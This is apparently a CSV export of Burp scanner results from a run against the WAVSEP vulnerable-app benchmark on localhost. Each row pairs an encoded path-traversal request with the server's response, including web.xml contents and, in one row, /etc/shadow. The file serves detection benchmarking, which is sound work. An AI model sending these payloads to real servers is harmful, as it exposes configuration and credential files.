http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case14-LFI-FileClass-FilenameContext-Unrestricted-FileDirective-DefaultEmptyInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:07:55 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case28-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case28-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-NoPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 18
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-200Error/Case28-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultFullInput-NoPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:34 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case36-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/Case36-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp?target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Valid/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:09:12 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case38-LFI-FileClass-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp,1,Burp,File path traversal,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/Case38-LFI-FileClass-FilenameContext-BackslashTraversalValidation-OSPath-DefaultFullInput-AnyPathReq-Read.jsp?target=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-500Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:07:24 GMT
Connection: close
Content-Length: 343
root:*LOCK*:14600::::::
bin:*:18313:0:99999:7:::
daemon:*:18313:0:99999:7:::
adm:*:18313:0:99999:7:::
lp:*:18313:0:99999:7:::
sync:*:18313:0:99999:7:::
shutdown:*:18313:0:99999:7:::
halt:*:18313:0:99999:7:::
mail:*:18313:0:99999:7:::
operator:*:18313:0:99999:7:::
games:*:18313:0:99999:7:::
ftp:*:18313:0:99999:7:::
nobody:*:18313:0:99999:7:::"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case66-LFI-ContextStream-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case66-LFI-ContextStream-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-302Redirect/Case66-LFI-ContextStream-FilenameContext-WindowsTraversalRemoval-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:37 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case42-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case42-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case42-LFI-FileClass-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:03 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case48-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-NoPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case48-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-NoPathReq-Read.jsp?target=..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:50 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case23-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/Case23-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp?target=.%2f HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-302Redirect/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 302 
Location: MissingResource.html
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 0
Date: Tue, 23 Apr 2024 14:08:04 GMT
Connection: close
"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case43-LFI-FileClass-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/Case43-LFI-FileClass-FilenameContext-UnixTraversalValidation-OSPath-DefaultFullInput-BackslashPathReq-Read.jsp?target=%2f.%2fnone892j3kd.txt HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Identical/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:04:44 GMT
Connection: close
Content-Length: 1715

<!DOCTYPE html PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN"" ""http://www.w3.org/TR/html4/loose.dtd"">
<html>
<head>
<meta http-equiv=""Content-Type"" content=""text/html; charset=ISO-8859-1"">
<title>Local File Inclusion Test Case</title>
</head>
<body>

	















<B>File delimiter: </B>/<BR>
<B>Line delimiter (encoded): </B>&#38;&#35;10&#59;<BR>
<B>User Directory Path (Absolute): </B>/usr/local/tomcat<BR>
<B>Deployment Path Root (Absolute): </B>/usr/local/tomcat/webapps/wavsep/<BR>
<B>Depl [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case36-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case36-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultEmptyInput-BackslashPathReq-Read.jsp?target=..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:47 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case22-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"GET /wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/Case22-LFI-FileClass-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp?target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-GET-200Error/index.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
","HTTP/1.1 200 
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:06:43 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 81
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-404Error/Case35-LFI-ContextStream-FilenameContext-Unrestricted-OSPath-DefaultInvalidInput-BackslashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2factive%2fLFI%2fLFI-Detection-Evaluation-POST-404Error%2f..%2f..%2f..%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:00 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp,1,Burp,File path manipulation,-1,,"POST /wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp HTTP/1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: close
Host: 127.0.0.1:18080
Content-Length: 21
Cache-Control: max-age=0
sec-ch-ua: ""Chromium"";v=""109"", ""Not_A Brand"";v=""99""
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""Linux""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:18080
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:18080/wavsep/active/LFI/LFI-Detection-Evaluation-POST-500Error/Case50-LFI-ContextStream-FilenameContext-WindowsTraversalValidation-OSPath-DefaultFullInput-SlashPathReq-Read.jsp
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=49D9F0EFE67AB924D10CBC13E1843D1B
target=%2f..%2f..%2f..%2fWEB-INF%2fweb.xml","HTTP/1.1 200 
Content-Type: application/octet-stream;charset=ISO-8859-1
Date: Tue, 23 Apr 2024 14:05:58 GMT
Connection: close
Content-Length: 1398
<?xml version=""1.0"" encoding=""UTF-8""?>
<web-app xmlns=""http://xmlns.jcp.org/xml/ns/javaee""
         xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
         xsi:schemaLocation=""http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd""
         version=""4.0"">
        <display-name>wavsep-enhancement</display-name>
        <security-constraint>
                <display-name>SecurityConstraint</display-name>
                <web-resource-collection>
               [...]"
